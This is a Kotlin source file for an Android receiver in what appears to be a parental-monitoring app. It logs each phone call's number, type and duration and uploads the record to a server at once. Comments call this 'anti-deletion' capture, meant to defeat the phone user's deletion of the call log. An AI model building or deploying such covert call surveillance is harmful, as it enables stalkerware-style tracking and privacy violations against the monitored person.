package com.parental.agent.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import android.util.Log
import com.parental.agent.collectors.calls.CallCollector
import com.parental.agent.data.local.AppDatabase
import com.parental.agent.data.local.AppPreferences
import com.parental.agent.data.local.entity.NormalizedEventEntity
import com.parental.agent.sync.ApiConstants
import com.parental.agent.sync.SyncPayload
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.util.UUID

class CallStateReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "CallStateReceiver"
        
        // Static in-memory call state tracking (survives app process, immune to call log deletion)
        private var lastState = TelephonyManager.EXTRA_STATE_IDLE
        private var callStartTime: Long = 0
        private var isIncoming: Boolean = false
        private var lastNumber: String = "Unknown"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (TelephonyManager.ACTION_PHONE_STATE_CHANGED == intent.action) {
            val stateStr = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
            val incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
            
            if (incomingNumber != null && incomingNumber.isNotBlank()) {
                lastNumber = incomingNumber
            }

            Log.d(TAG, "Phone State Transition: state=$stateStr, number=$lastNumber")

            when (stateStr) {
                TelephonyManager.EXTRA_STATE_RINGING -> {
                    isIncoming = true
                    callStartTime = System.currentTimeMillis()
                    lastState = TelephonyManager.EXTRA_STATE_RINGING
                }
                TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                    if (lastState != TelephonyManager.EXTRA_STATE_RINGING) {
                        isIncoming = false
                    }
                    callStartTime = System.currentTimeMillis()
                    lastState = TelephonyManager.EXTRA_STATE_OFFHOOK
                }
                TelephonyManager.EXTRA_STATE_IDLE -> {
                    if (lastState == TelephonyManager.EXTRA_STATE_RINGING || lastState == TelephonyManager.EXTRA_STATE_OFFHOOK) {
                        val durationMs = if (callStartTime > 0) System.currentTimeMillis() - callStartTime else 0
                        val durationSec = (durationMs / 1000).toInt()
                        val callType = when {
                            lastState == TelephonyManager.EXTRA_STATE_RINGING -> "MISSED"
                            isIncoming -> "INCOMING"
                            else -> "OUTGOING"
                        }

                        Log.i(TAG, "ANTI-DELETION INTERCEPTION: Captured $callType call ($lastNumber, ${durationSec}s) BEFORE system log deletion!")

                        // Reset tracking state
                        lastState = TelephonyManager.EXTRA_STATE_IDLE
                        callStartTime = 0

                        val prefs = AppPreferences(context)
                        val activeDeviceId = prefs.getDeviceId()

                        // Instantly record to Room DB and upload to server
                        CoroutineScope(Dispatchers.IO).launch {
                            try {
                                val database = AppDatabase.getInstance(context)
                                
                                val payload = JSONObject().apply {
                                    put("phoneNumber", lastNumber)
                                    put("contactName", "Target Contact")
                                    put("callType", callType)
                                    put("callDate", System.currentTimeMillis())
                                    put("durationSeconds", durationSec)
                                    put("antiDeletionCaptured", true)
                                }

                                val eventEntity = NormalizedEventEntity(
                                    eventId = "evt_call_" + UUID.randomUUID().toString(),
                                    deviceId = activeDeviceId,
                                    source = "calls",
                                    eventType = "call_record",
                                    timestamp = System.currentTimeMillis(),
                                    collectionMethod = "broadcast_receiver",
                                    payloadJson = payload.toString(),
                                    isSynced = false
                                )

                                database.eventDao().insertEvent(eventEntity)
                                
                                // Secondary query from system ContentProvider
                                val collector = CallCollector(context)
                                collector.collect()

                                // Immediate Network Upload
                                performInstantUpload(context, database, activeDeviceId)

                            } catch (e: Exception) {
                                Log.e(TAG, "Error in anti-deletion call capture: ${e.message}", e)
                            }
                        }
                    }
                }
            }
        }
    }

    private suspend fun performInstantUpload(context: Context, database: AppDatabase, activeDeviceId: String) {
        val unsyncedEvents = database.eventDao().getUnsyncedEvents(limit = 20)

        if (unsyncedEvents.isNotEmpty()) {
            val eventPayloads = unsyncedEvents.map { entity ->
                val payloadMap = try {
                    val json = JSONObject(entity.payloadJson)
                    val map = mutableMapOf<String, Any?>()
                    json.keys().forEach { key -> map[key] = json.get(key) }
                    map
                } catch (e: Exception) {
                    emptyMap<String, Any?>()
                }

                mapOf(
                    "eventId" to entity.eventId,
                    "deviceId" to activeDeviceId,
                    "source" to entity.source,
                    "eventType" to entity.eventType,
                    "timestamp" to entity.timestamp,
                    "collectionMethod" to entity.collectionMethod,
                    "payload" to payloadMap
                )
            }

            val payload = SyncPayload(
                deviceId = activeDeviceId,
                events = eventPayloads
            )

            Log.i(TAG, "Executing Instant 0-Delay HTTP POST Upload to server for device $activeDeviceId...")
            val response = ApiConstants.apiService.syncEvents(payload)

            if (response.isSuccessful && response.body()?.success == true) {
                val body = response.body()
                val serverConfirmedIds = body?.syncedEventIds.orEmpty()
                val localEventIds = unsyncedEvents.map { it.eventId }
                val confirmedSyncedIds = localEventIds.filter { id -> serverConfirmedIds.contains(id) }

                if (confirmedSyncedIds.isNotEmpty()) {
                    database.eventDao().markEventsSynced(confirmedSyncedIds)
                    Log.i(TAG, "SUCCESS: Anti-Deletion Call Payload uploaded and server ACK confirmed for ${confirmedSyncedIds.size} event(s).")
                }
            } else {
                Log.w(TAG, "Instant Network Upload returned HTTP status: ${response.code()}")
            }
        }
    }
}
